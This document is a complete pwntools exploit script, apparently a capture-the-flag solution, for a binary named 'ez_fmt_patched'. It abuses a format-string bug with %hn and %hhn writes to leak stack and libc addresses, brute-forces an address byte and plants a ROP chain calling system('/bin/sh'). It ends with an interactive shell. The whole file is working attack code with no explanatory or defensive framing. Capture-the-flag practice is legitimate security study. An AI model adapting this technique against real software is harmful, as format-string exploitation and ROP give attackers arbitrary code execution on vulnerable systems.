from pwn import *

elf = context.binary = ELF("./ez_fmt_patched")
libc = ELF("./libc.so.6")
r = elf.process()

def debug():
    gdb.attach(r, '''
        b*main+112\n
        b*printf+198\n
        b*restricted_filter\n
        b*main+68\n
        c
    ''')
context.log_level='DEBUG'
r.sendlineafter(b"Service :##", b"%21$c|||")
r.recv()
last_byte = u8(r.recv(1))
last_byte = (last_byte - 0x158) & 0xff
log.success(f"Last byte: {hex(last_byte)}")

guess_byte = 0
for i in range(0x0, 0x100, 0x1):
    guess_byte = i * 0x100 + last_byte
    log.info(f"Guess byte: {hex(guess_byte)}  -->  {guess_byte}")
    payload = f"%{guess_byte+0x20}c%21$hn|||".encode()
    r.sendline(payload)
    payload = '%50c%49$hhnmmm'.encode()
    r.sendline(payload)
    r.sendlineafter(b'mmm\n', b'%10$cmmm') #Leak byte at offset 10
    recv = r.recvuntil(b'mmm\n')
    if(recv[0] == 50):  #0x20
        log.success("Breaking by offset 10")
        break

log.success('Guess: %#x' % guess_byte)
payload = f'%{guess_byte-8}c%21$hnmmm'.encode()  # 49 - 21
r.sendline(payload)
payload = f'%{guess_byte+8}c%37$hnmmm'.encode() #offset37: 0xf8 - 51
r.sendlineafter(b'mmm\n', payload)
 #  0x2b + 0x45 == 0x70 == "p"  #
payload = f'%{0x45}c%49$hhn%{0x2b}c%51$hhnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)
r.recvuntil(b'mmm\n')
r.recv(0x45)
stack = int(r.recv(14), 16) + 8
log.success('Input address: %#x' % stack)


payload = f'%{guess_byte-8}c%21$hnmmm'.encode()  # 49 - 21
r.sendline(payload)
payload = f'%{guess_byte+6}c%37$hnmmm'.encode() #offset37: 0xf8 - 51
r.sendlineafter(b'mmm\n', payload)
val = int.from_bytes(b"9$p", "little") - 0x45
payload = f"%{0x45}c%10$hhn%{val}c%51$nmmm".encode().ljust(0x20, b"\0") + p64(stack-8)
r.sendlineafter(b"mmm\n", payload)
r.recvuntil(b'0x')
libc.address = int(r.recv(14),16) - 147635
log.success(f"Libc address: {hex(libc.address)}")


pop_rdi = 0x0000000000023b72 + libc.address
ret = 400774 + libc.address
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

r.sendline(b"mmm")
def write(addr, value):
    for i in range(3):
        val = (value >> (16 * i)) & 0xffff
        payload = f'%{val}c%10$hnmmm'.encode().ljust(0x20, b'\0') + p64(addr + (i*2))
        r.sendlineafter(b'mmm', payload)

    payload = f'%10$hnmmm'.encode().ljust(0x20, b'\0') + p64(addr + 6)
    r.sendlineafter(b'mmm', payload)

write(stack+0x68, pop_rdi)
log.success("OKE")
write(stack+0x70, binsh)
log.success("OKE")
write(stack+0x78, ret)
log.success("OKE")
write(stack+0x80, system)
log.success("OKE")
# debug()
def gen_payload(l):
    payload = ''
    sum = 0
    value = 0
    for i in l:
        if i[1] == 'hhn':
            if i[0] < (sum & 0xff):
                value = (i[0] - (sum & 0xff)) + 0x100
            else:
                value = i[0] - (sum & 0xff)
        elif i[1] == 'hn':
            if i[0] < (sum & 0xffff):
                value = (i[0] - (sum & 0xffff)) + 0x10000
            else:
                value = i[0] - (sum & 0xffff)
        elif i[1] == 'n':
            if i[0] < (sum & 0xffffffff):
                value = (i[0] - (sum & 0xffffffff)) + 0x100000000
            else:
                value = i[0] - (sum & 0xffffffff)

        sum += value
        payload += f'%{value}c%{i[2]}$' + i[1]

    return payload.encode()

add_rsp_0x68 = 0x000000000010e4fc
addr = libc.address + add_rsp_0x68
part1 = addr & 0xffff
part2 = (addr >> 16) & 0xffff
part3 = (addr >> 32) & 0xffff
payload = gen_payload([[part1, 'hn', 12], [part2, 'hn', 13], [part3, 'hn', 14]])
payload = payload.ljust(0x30, b'\0') + p64(stack-8 + 0) + p64(stack- 8 + 2) + p64(stack-8+4)
r.sendlineafter(b'mmm', payload)
r.interactive()